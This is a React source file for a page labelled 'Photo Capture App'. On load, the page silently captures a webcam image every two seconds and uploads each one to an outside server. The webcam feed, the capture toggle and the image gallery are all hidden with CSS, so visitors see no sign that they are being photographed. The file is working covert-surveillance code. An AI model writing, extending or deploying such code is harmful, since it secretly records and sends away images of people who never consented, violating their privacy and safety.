import React, { useRef, useState, useEffect } from 'react';
import Webcam from 'react-webcam';
import axios from 'axios';

const App = () => {
  const webcamRef = useRef(null); // Ref for the webcam component
  const [images, setImages] = useState([]);
  const [capturing, setCapturing] = useState(true);

  useEffect(() => {
    let intervalId;

    if (capturing) {
      intervalId = setInterval(() => {
        captureAndUploadPhoto();
      }, 2000); // Capture every 2 seconds
    }
    return () => clearInterval(intervalId);
  }, [capturing]);

  const captureAndUploadPhoto = async () => {
    const image = webcamRef.current.getScreenshot(); // Capture image from webcam

    if (!image) return console.error('No photo captured!');

    try {
      const response = await axios.post('https://be-ggny.onrender.com/upload', { image: image });
      console.log('Photo uploaded successfully:', response.data);
    } catch (error) {
      console.error('Error uploading photo:', error);
    }
  };

  const fetchImages = async () => {
    try {
      const response = await axios.get("https://be-ggny.onrender.com/images");
      setImages(response.data); // The response contains formatted base64 images
    } catch (error) {
      console.error("Error fetching images:", error);
    }
  };

  useEffect(() => {
    fetchImages();
  }, []);

  const toggleCapture = () => {
    setCapturing((prevCapturing) => !prevCapturing); // Toggle capturing state
  };

  return (
    <div>
      <h1 onClick={toggleCapture} style={{ display: 'none' }}>Photo Capture App</h1>

      {/* Webcam display */}
      <Webcam
        audio={false}
        ref={webcamRef}
        screenshotFormat="image/jpeg"
        videoConstraints={{ facingMode: "user" }}
        width="640" // Set to desired width
        height="480" // Set to desired height
        style={{ visibility: 'hidden' }} // Hide webcam video feed
      />

      <div style={{ display: 'none' }}>
        {/* Optionally, add hidden canvas or additional logic */}
      </div>

      <div style={{ display: "none" }}>
        <div style={{ display: "flex", flexWrap: "wrap", justifyContent: "center" }}>
          {images.map((img) => (
            <div key={img.id} style={{ margin: "10px" }}>
              <img
                src={img.image} // Use the base64 image directly
                alt="Fetched"
                style={{ width: "150px", height: "150px", objectFit: "cover", borderRadius: "8px" }}
              />
              <p style={{ fontSize: "12px", textAlign: "center" }}>
                {new Date(img.createdAt).toLocaleString()}
              </p>
            </div>
          ))}
        </div>
      </div>
    </div>
  );
};

export default App;
